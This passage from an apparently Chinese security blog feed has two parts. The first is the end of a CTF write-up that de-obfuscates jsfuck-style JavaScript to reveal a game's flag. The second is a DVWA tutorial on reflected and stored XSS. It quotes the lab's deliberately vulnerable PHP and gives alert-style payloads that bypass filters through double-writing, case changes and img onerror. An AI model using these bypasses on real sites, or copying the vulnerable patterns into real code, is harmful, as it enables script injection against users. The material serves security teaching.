V120E52N40A95t95T79x120Q97R50o55F56e49Y91i48G120p97P93y44S32J95k48r120q53g49i57E55x120D52O40N95H48S120d53i49M57H55x120e52e40X95k95Z79q120C97l50T55K56I49k91R48o120g98g93Q44v32r95R95K79W120N97u50A55v56Z49m91A48x120X99H93x41y44T32w95n95v79i120g97E50y55h56m49C91X48S120N100w93n41q41b59M10I32e32F32g32e116J114t121I32r123N10M32J32N32m32j32l32J32g32X95n48g120l53X49b57l55D120p50s32b61T32f95W95E101N110o99c111M100M101Q59f10J32k32y32K32B32F32X32R32K105d102c32b40e33U40o116q121j112D101A111D102c32x95p48o120R53a49b57S55d120M50d32p33q61s61o32d95z48B120A53s49S57t55a120j55H32B38S38e32N95i48L120O53j49W57O55V120P50X32o61Y61i61k32P95j48M120Z53O49t57W55P120p52V40d95N95y79a120X97r50t55o56v49a91I48m120m101p93B44T32V95b95j79s120M97q50p55j56G49A91g48i120O102U93G41y41a41i32F123F10O32Z32o32T32P32e32Z32K32T32h32z32d32b95l48V120H53v49J57I55L120w53J40n95M48o120F53C49d57W55e120S54R41U10U32u32C32c32x32z32y32J32F125L10H32K32G32r32d125e32A99A97l116x99y104R32H40B101U41W32j123A10m32t32b32L32A32A32B32D32Z95t48z120m53V49N57N55B120x53Z40m95k48c120A53L49M57V55R120l54U41X10E32R32G32Q32q125U10D125p41P40A123E125S41&quot;[&#39;\x73\x70\x6c\x69\x74&#39;](&#x2F;[a-zA-Z]&#123;1,&#125;&#x2F;))))(&#39;sojson.v4&#39;);</span><br></pre></td></tr></table></figure><p>脱unicode</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;sojson.v4&#39;][&quot;filter&quot;][&quot;constructor&quot;]((([&#39;sojson.v4&#39;]+[])[&quot;constructor&quot;][&#39;fromCharCode&#39;][&#39;apply&#39;](null,&quot;118h97x11……&quot;[&#39;split&#39;](&#x2F;[a-zA-Z]&#123;1,&#125;&#x2F;))))(&#39;sojson.v4&#39;);</span><br></pre></td></tr></table></figure><p>jsfuck中，</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eval &#x3D;&gt; [][&quot;filter&quot;][&quot;constructor&quot;]( CODE )()</span><br></pre></td></tr></table></figure><p>因此上述代码相当于</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(([&#39;sojson.v4&#39;]+[])[&quot;constructor&quot;][&#39;fromCharCode&#39;][&#39;apply&#39;](null,&quot;118h97x11……&quot;[&#39;split&#39;](&#x2F;[a-zA-Z]&#123;1,&#125;&#x2F;)))</span><br></pre></td></tr></table></figure><p>复制到浏览器控制台，即得到源码</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> __encode = <span class="string">&#x27;jsjiami.com&#x27;</span>,</span><br><span class="line">    _a = &#123;&#125;,</span><br><span class="line">    _0xb483 = [\<span class="string">&quot;_decode\&quot;, \&quot;http://www.sojson.com/javascriptobfuscator.html\&quot;];</span></span><br><span class="line"><span class="string">(function(_0xd642x1) &#123;</span></span><br><span class="line"><span class="string">    _0xd642x1[_0xb483[0]] = _0xb483[1]</span></span><br><span class="line"><span class="string">&#125;)(_a);</span></span><br><span class="line"><span class="string">var __Oxa2781 = [\&quot;\&quot;, \&quot;-paused-\&quot;, \&quot;Win! flag&#123;this_game_is_funny!&#125;\&quot;, \&quot;Game Over!\&quot;, \&quot;Press Escape\&quot;, \&quot;x\&quot;, \&quot;y\&quot;, \&quot;center\&quot;, \&quot;undefined\&quot;, \&quot;log\&quot;, \&quot;删除\&quot;, \&quot;版本号，js会定\&quot;, \&quot;期弹窗，\&quot;, \&quot;还请支持我们的工作\&quot;, \&quot;jsjia\&quot;, \&quot;mi.com\&quot;];</span></span><br><span class="line"><span class="string">let bigText = __Oxa2781[0x0];</span></span><br><span class="line"><span class="string">if (paused) &#123;</span></span><br><span class="line"><span class="string">    bigText = __Oxa2781[0x1]</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">if (winTimer.IsSet()) &#123;</span></span><br><span class="line"><span class="string">    bigText = __Oxa2781[0x2]</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">if (player.IsDead()) &#123;</span></span><br><span class="line"><span class="string">    bigText = __Oxa2781[0x3];</span></span><br><span class="line"><span class="string">    DrawText(__Oxa2781[0x4], mainCanvasSize[__Oxa2781[0x5]] / 2, mainCanvasSize[__Oxa2781[0x6]] / 2 + 80, 42)</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">DrawText(bigText, mainCanvasSize[__Oxa2781[0x5]] / 2, mainCanvasSize[__Oxa2781[0x6]] / 2 - 80, 72, __Oxa2781[0x7], 2);;;</span></span><br><span class="line"><span class="string">(function(_0x5197x2, _0x5197x3, _0x5197x4, _0x5197x5, _0x5197x6, _0x5197x7) &#123;</span></span><br><span class="line"><span class="string">    _0x5197x7 = __Oxa2781[0x8];</span></span><br><span class="line"><span class="string">    _0x5197x5 = function(_0x5197x8) &#123;</span></span><br><span class="line"><span class="string">        if (typeof alert !== _0x5197x7) &#123;</span></span><br><span class="line"><span class="string">            alert(_0x5197x8)</span></span><br><span class="line"><span class="string">        &#125;;</span></span><br><span class="line"><span class="string">        if (typeof console !== _0x5197x7) &#123;</span></span><br><span class="line"><span class="string">            console[__Oxa2781[0x9]](_0x5197x8)</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;;</span></span><br><span class="line"><span class="string">    _0x5197x4 = function(_0x5197x9, _0x5197x2) &#123;</span></span><br><span class="line"><span class="string">        return _0x5197x9 + _0x5197x2</span></span><br><span class="line"><span class="string">    &#125;;</span></span><br><span class="line"><span class="string">    _0x5197x6 = _0x5197x4(__Oxa2781[0xa], _0x5197x4(_0x5197x4(__Oxa2781[0xb], __Oxa2781[0xc]), __Oxa2781[0xd]));</span></span><br><span class="line"><span class="string">    try &#123;</span></span><br><span class="line"><span class="string">        _0x5197x2 = __encode;</span></span><br><span class="line"><span class="string">        if (!(typeof _0x5197x2 !== _0x5197x7 &amp;&amp; _0x5197x2 === _0x5197x4(__Oxa2781[0xe], __Oxa2781[0xf]))) &#123;</span></span><br><span class="line"><span class="string">            _0x5197x5(_0x5197x6)</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125; catch (e) &#123;</span></span><br><span class="line"><span class="string">        _0x5197x5(_0x5197x6)</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;)(&#123;&#125;)</span></span><br></pre></td></tr></table></figure><p>可以看到flag了。</p><p>后来发现直接把那一大段复制了然后在浏览器控制台里输入，点击那个报错的就可以看到源码了。<em>(:з」∠)</em></p><p>后后来发现找到game.js里通关的逻辑，在控制台输入winTimer.set(1)就可以直接弹出来flag了。<em>(:з」∠)</em></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="writeup" scheme="https://blog.pillar.fun/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>XSS</title>
    <link href="https://blog.pillar.fun/2021/03/11/XSS/"/>
    <id>https://blog.pillar.fun/2021/03/11/XSS/</id>
    <published>2021-03-11T13:49:49.000Z</published>
    <updated>2021-03-19T16:09:45.360Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>XSS作为OWASP top10之一，是不容小视的安全威胁。</p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>人们经常将跨站脚本攻击（Cross Site Scripting）缩写为CSS，但这会与层叠样式表（Cascading Style Sheets，CSS）的缩写混淆。因此，有人将跨站脚本攻击缩写为XSS。<br>跨站脚本攻击（XSS），是最普遍的Web应用安全漏洞。这类漏洞能够使得攻击者嵌入恶意脚本代码到正常用户会访问到的页面中，当正常用户访问该页面时，则可导致嵌入的恶意脚本代码的执行，从而达到恶意攻击用户的目的。<br>XSS的分类<br>绿盟这张图我觉得挺好<br><img src="/2021/03/11/XSS/1.png" alt><br>但是由于广泛被接受的分类是反射型、存储型、DOM-based，并且DVWA也是这三类，因此我们还按照反射型、存储型和DOM-based型来简单分析</p><h1 id="DVWA之反射型XSS"><a href="#DVWA之反射型XSS" class="headerlink" title="DVWA之反射型XSS"></a>DVWA之反射型XSS</h1><h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><p>开局一个输入框，直接回显html，无任何过滤<br><img src="/2021/03/11/XSS/1.jpg" alt><br>因此直接用&lt;script&gt;就可以利用了<br>查看源代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>确实直接就echo了输入的name，且没有过滤。</p><h2 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h2><p>开局一个输入框，发现会过滤&lt;script&gt;，但是不会过滤&lt;/script&gt;<br>于是直接双写，输入<code>&lt;scr&lt;script&gt;ipt&gt;</code>，发现成了。<br><img src="/2021/03/11/XSS/2.jpg" alt><br>查看源代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>果然仅仅简单的将&lt;script&gt;删掉了罢了<br>于是还可以用大小写绕过，比如&lt;scRipt&gt;</p><h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><p>emmm直接看源码了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到用了正则表达式过滤了。<br>但是可以通过img、body等标签的事件或者iframe等标签的src注入恶意的js代码<br>比如酱紫<code>&lt;img src=&quot;&quot; οnerrοr=&quot;alert(&#39;XSS&#39;)&quot;&gt;</code></p><h2 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h2><p>众所周知，DVWAimpossible就差不多是impossible了。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = htmlspecialchars( <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>不但使用了htmlspecialchars（）把&lt;&gt;都给过滤了，还用了session，且session并没有在response里。<br>好！impossible！</p><h1 id="DVWA之存储射型XSS"><a href="#DVWA之存储射型XSS" class="headerlink" title="DVWA之存储射型XSS"></a>DVWA之存储射型XSS</h1><h2 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h2><p>开局一个注册，可以提交的有name和message<br>直接回显输入的所有内容，包括name和message。<br>但是name有长度限制，直接改前端<br>在name输入<code>&lt;script&gt;alert(&quot;name&quot;)&lt;/script&gt;</code>，然后在message输入<code>&lt;script&gt;alert(&quot;message&quot;)&lt;/script&gt;</code><br><img src="/2021/03/11/XSS/3.jpg" alt><br><img src="/2021/03/11/XSS/4.jpg" alt><br><img src="/2021/03/11/XSS/5.jpg" alt><br>（而且还会把库里所有的东西都echo出来）<br>看源代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = stripslashes( <span class="variable">$message</span> );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>和预想的几乎一样，只用了一个trim过滤空格、换行、缩进等，并没有针对DOM的标签。</p><h2 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h2><p>猜测和反射型一样，于是用大小写绕过<br><img src="/2021/03/11/XSS/5.jpg" alt><br>发现message还加了一个引号过滤。<br>查看源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = strip_tags( addslashes( <span class="variable">$message</span> ) );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$message</span> = htmlspecialchars( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/03/11/XSS/6.jpg" alt><br>可以看到和我们的预想一样，但是只给message用了addslashes，此外还用了一个htmlspecialchars，因此message基本不能注入了。但是name的注入依旧只是简单的过滤罢了没有影响。</p><h2 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h2><p>直接看代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = strip_tags( addslashes( <span class="variable">$message</span> ) );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$message</span> = htmlspecialchars( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以发现message像medium一样，过滤的很完善，而name加了正则，同样和反射型一样用含有src的标签用onerror即可</p><h2 id="impossible-1"><a href="#impossible-1" class="headerlink" title="impossible"></a>impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = stripslashes( <span class="variable">$message</span> );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$message</span> = htmlspecialchars( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = stripslashes( <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$name</span> = htmlspecialchars( <span class="variable">$name</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$data</span> = <span 